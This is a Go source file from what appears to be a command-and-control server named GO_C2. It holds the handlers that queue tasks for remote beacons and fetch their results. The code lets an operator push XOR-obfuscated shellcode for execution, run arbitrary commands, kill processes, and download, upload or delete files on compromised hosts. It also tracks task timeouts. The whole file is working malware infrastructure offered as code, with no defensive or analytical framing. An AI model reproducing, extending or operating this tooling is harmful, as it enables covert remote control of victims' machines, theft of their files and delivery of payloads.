package handler

import (
    "encoding/base64"
    "fmt"
    "log"
    "net/http"
    "github.com/gin-gonic/gin"
    "GO_C2/db"
    "GO_C2/utils"
    "strings"
    "time"
)

const (
    TASK_NULL      = 0x00
    TASK_SLEEP     = 0x1A
    TASK_PROCLIST  = 0x1B
    TASK_SHELLCODE = 0x1C
    TASK_EXECUTE   = 0x1D
    TASK_PROC_KILL = 0x1E
    TASK_FILE_LIST = 0x21
    TASK_FILE_DOWNLOAD = 0x22
    TASK_FILE_UPLOAD = 0x23
    TASK_FILE_DELETE = 0x24
    TASK_FILE_MKDIR = 0x25
)

type JobRequest struct {
    Type string `json:"type"`
    SleepTime int `json:"sleep_time,omitempty"`
    Shellcode string `json:"shellcode,omitempty"`
    Command string `json:"command,omitempty"`
    PID int `json:"pid,omitempty"`
    Path string `json:"path,omitempty"`
    Content string `json:"content,omitempty"`
    Data string `json:"data,omitempty"`
}

func CreateJobHandler(c *gin.Context) {
    uuid := c.Param("uuid")
    if !utils.ValidateUUID(uuid) { c.JSON(http.StatusBadRequest, gin.H{"error":"Invalid UUID"}); return }
    var req JobRequest
    if err := c.BindJSON(&req); err != nil { c.JSON(http.StatusBadRequest, gin.H{"error":"Invalid request"}); return }
    var jobData string
    switch req.Type {
    case "0x00": jobData = string([]byte{TASK_NULL})
    case "0x1A":
        // 兼容两种入参：sleep_time 数字 或 data: "Sleep %d"
        sleep := req.SleepTime
        if sleep <= 0 && req.Data != "" {
            var parsed int
            if _, err := fmt.Sscanf(req.Data, "Sleep %d", &parsed); err == nil { sleep = parsed }
        }
        if sleep <= 0 { c.JSON(http.StatusBadRequest, gin.H{"error":"Invalid sleep time"}); return }
        jobData = fmt.Sprintf("%c%d", TASK_SLEEP, sleep)
        _ = dbSetSleep(uuid, sleep)
        // Sleep 无回传：直接写完成历史，便于前端立即看到
        createCompletedTaskHistory(uuid, "Sleep", fmt.Sprintf("Set sleep time to %d seconds", sleep), "OK")
    case "0x1B":
        jobData = string([]byte{TASK_PROCLIST})
        createTaskHistory(uuid, "Process List", "Get running processes")
        _, _ = db.DB.Exec("UPDATE beacons SET current_task = ? WHERE uuid = ?", "Process List", uuid)
        schedulePendingTimeout(uuid, "Process List", "Get running processes")
    case "0x1C":
        if req.Shellcode == "" { c.JSON(http.StatusBadRequest, gin.H{"error":"Shellcode is required"}); return }
        // 解码前端传来的base64 shellcode（前端已经将二进制文件转为base64）
        shellcodeBytes, err := base64.StdEncoding.DecodeString(req.Shellcode)
        if err != nil { c.JSON(http.StatusBadRequest, gin.H{"error":"Invalid shellcode data (must be base64 encoded)"}); return }
        // 使用XOR加密（与beacon端使用相同的密钥）
        xorKey := utils.GetXORKey()
        encryptedShellcode := utils.XOREncryptDecrypt(shellcodeBytes, xorKey)
        // 使用自定义Base64编码（与beacon端保持一致）
        encodedShellcode := utils.CustomBase64Encode(encryptedShellcode)
        // 构造任务数据：任务类型 + base64编码的XOR加密shellcode
        jobData = string(append([]byte{TASK_SHELLCODE}, []byte(encodedShellcode)...))
        createTaskHistory(uuid, "Shellcode", "Execute encrypted shellcode")
        _, _ = db.DB.Exec("UPDATE beacons SET current_task = ? WHERE uuid = ?", "Shellcode", uuid)
        schedulePendingTimeout(uuid, "Shellcode", "Execute encrypted shellcode")
    case "0x1D":
        // 支持两种字段：command 或 data
        cmd := strings.TrimSpace(req.Command)
        if cmd == "" { cmd = strings.TrimSpace(req.Data) }
        if cmd == "" { c.JSON(http.StatusBadRequest, gin.H{"error":"Command is required"}); return }
        jobData = string(append([]byte{TASK_EXECUTE}, []byte(cmd)...))
        createTaskHistory(uuid, "Execute", fmt.Sprintf("Execute command: %s", cmd))
        _, _ = db.DB.Exec("UPDATE beacons SET current_task = ? WHERE uuid = ?", "Execute", uuid)
        schedulePendingTimeout(uuid, "Execute", fmt.Sprintf("Execute command: %s", cmd))
    case "0x1E": if req.PID <= 0 { c.JSON(http.StatusBadRequest, gin.H{"error":"PID is required"}); return }; jobData = string(append([]byte{TASK_PROC_KILL}, []byte(fmt.Sprintf("%d", req.PID))...)); createTaskHistory(uuid, "Kill Process", fmt.Sprintf("Kill PID %d", req.PID)); _, _ = db.DB.Exec("UPDATE beacons SET current_task = ? WHERE uuid = ?", "Kill Process", uuid)
        schedulePendingTimeout(uuid, "Kill Process", fmt.Sprintf("Kill PID %d", req.PID))
    case "0x21":
        // List directory: accept Path or Data
        path := strings.TrimSpace(req.Path)
        if path == "" { path = strings.TrimSpace(req.Data) }
        if path == "" { c.JSON(http.StatusBadRequest, gin.H{"error":"Path is required"}); return }
        jobData = string(append([]byte{TASK_FILE_LIST}, []byte(path)...))
        createTaskHistory(uuid, "List Directory", fmt.Sprintf("List %s", path))
        _, _ = db.DB.Exec("UPDATE beacons SET current_task = ? WHERE uuid = ?", "List Directory", uuid)
        schedulePendingTimeout(uuid, "List Directory", fmt.Sprintf("List %s", path))
    case "0x22":
        // Download file: 支持可选 RANGE <offset> <length> 头，便于服务端分片拉取
        path := strings.TrimSpace(req.Path)
        if path == "" { path = strings.TrimSpace(req.Data) }
        if path == "" { c.JSON(http.StatusBadRequest, gin.H{"error":"Path is required"}); return }
        // 直接兼容旧参数：如果 Data 里自带 RANGE 头，则原样透传；否则仅下发路径
        var payload string
        if strings.HasPrefix(strings.TrimSpace(req.Data), "RANGE ") {
            payload = strings.TrimSpace(req.Data) + "\n" + path
        } else {
            payload = path
        }
        jobData = string(append([]byte{TASK_FILE_DOWNLOAD}, []byte(payload)...))
        createTaskHistory(uuid, "Download File", fmt.Sprintf("Download %s", path))
        _, _ = db.DB.Exec("UPDATE beacons SET current_task = ? WHERE uuid = ?", "Download File", uuid)
        schedulePendingTimeout(uuid, "Download File", fmt.Sprintf("Download %s", path))
    case "0x23":
        if req.Command != "" {
            jobData = string(append([]byte{TASK_FILE_UPLOAD}, []byte(req.Command)...))
        } else if req.Path != "" && req.Content != "" {
            payload := fmt.Sprintf("%s\n%s", req.Path, req.Content)
            jobData = string(append([]byte{TASK_FILE_UPLOAD}, []byte(payload)...))
        } else if req.Command == "" && req.Path == "" && req.Content == "" && req.Data != "" {
            jobData = string(append([]byte{TASK_FILE_UPLOAD}, []byte(req.Data)...))
        } else { c.JSON(http.StatusBadRequest, gin.H{"error":"Path and content are required"}); return }
        createTaskHistory(uuid, "Upload File", "Upload file")
        _, _ = db.DB.Exec("UPDATE beacons SET current_task = ? WHERE uuid = ?", "Upload File", uuid)
        schedulePendingTimeout(uuid, "Upload File", "Upload file")
    case "0x24":
        path := strings.TrimSpace(req.Path)
        if path == "" { path = strings.TrimSpace(req.Data) }
        if path == "" { c.JSON(http.StatusBadRequest, gin.H{"error":"Path is required"}); return }
        jobData = string(append([]byte{TASK_FILE_DELETE}, []byte(path)...))
        createTaskHistory(uuid, "Delete", fmt.Sprintf("Delete %s", path))
        _, _ = db.DB.Exec("UPDATE beacons SET current_task = ? WHERE uuid = ?", "Delete", uuid)
        schedulePendingTimeout(uuid, "Delete", fmt.Sprintf("Delete %s", path))
    case "0x25":
        path := strings.TrimSpace(req.Path)
        if path == "" { path = strings.TrimSpace(req.Data) }
        if path == "" { c.JSON(http.StatusBadRequest, gin.H{"error":"Path is required"}); return }
        jobData = string(append([]byte{TASK_FILE_MKDIR}, []byte(path)...))
        createTaskHistory(uuid, "Mkdir", fmt.Sprintf("Mkdir %s", path))
        _, _ = db.DB.Exec("UPDATE beacons SET current_task = ? WHERE uuid = ?", "Mkdir", uuid)
        schedulePendingTimeout(uuid, "Mkdir", fmt.Sprintf("Mkdir %s", path))
    default: c.JSON(http.StatusBadRequest, gin.H{"error":"Invalid task type"}); return
    }
    if err := db.UpdateBeaconJob(uuid, jobData); err != nil { c.JSON(http.StatusInternalServerError, gin.H{"error":"Failed to create job"}); return }
    c.JSON(http.StatusOK, gin.H{"status":"success","message":"Job created successfully"})
}

func GetJobResultHandler(c *gin.Context) {
    uuid := c.Param("uuid")
    if !utils.ValidateUUID(uuid) { c.JSON(http.StatusBadRequest, gin.H{"error":"Invalid UUID"}); return }
    beacon, err := db.GetBeaconByUUID(uuid)
    if err != nil { c.JSON(http.StatusInternalServerError, gin.H{"error":"Failed to get job result"}); return }
    var result string
    if beacon.JobResult != "" { if decoded, err := base64.StdEncoding.DecodeString(beacon.JobResult); err == nil { result = string(decoded) } else { result = beacon.JobResult } }
    c.JSON(http.StatusOK, gin.H{"status":"success","result": result})
}

// schedulePendingTimeout 在创建 pending 任务后调度一个超时检查，将超时未回显的任务标记为 timeout
// 超时：文件操作任务使用固定30秒，其他任务使用动态计算
func schedulePendingTimeout(beaconUUID, taskType, command string) {
    go func() {
        // 文件操作任务使用固定超时时间
        var wait time.Duration
        if taskType == "Download File" {
            wait = 60 * time.Second  // 文件下载：60秒超时（支持大文件）
        } else if taskType == "Upload File" || taskType == "List Directory" {
            wait = 30 * time.Second  // 文件上传和列表：30秒超时
        } else {
            // 其他任务：读取心跳（Sleep 秒），计算等待窗口
            b, err := db.GetBeaconByUUID(beaconUUID)
            if err != nil { return }
            hb := b.SleepSeconds
            if hb <= 0 { hb = 10 }
            wait = time.Duration(hb+5) * time.Second
            if wait < 10*time.Second { wait = 10 * time.Second }
            if wait > 120*time.Second { wait = 120 * time.Second }
        }
        
        log.Printf("Scheduling timeout for task: UUID=%s, Type=%s, Command=%s, Timeout=%v", beaconUUID, taskType, command, wait)
        time.Sleep(wait)
        // 查找最近的 pending 记录并标记为 timeout（若尚未完成）
        histories, err := db.GetTaskHistoryByBeaconUUID(beaconUUID)
        if err != nil { return }
        var targetID int64
        for _, h := range histories {
            if h.TaskType == taskType && h.Command == command && h.Status == "pending" {
                targetID = h.ID
                break
            }
        }
        if targetID > 0 {
            _ = db.UpdateTaskHistory(targetID, "timeout", "")
        }
    }()
}


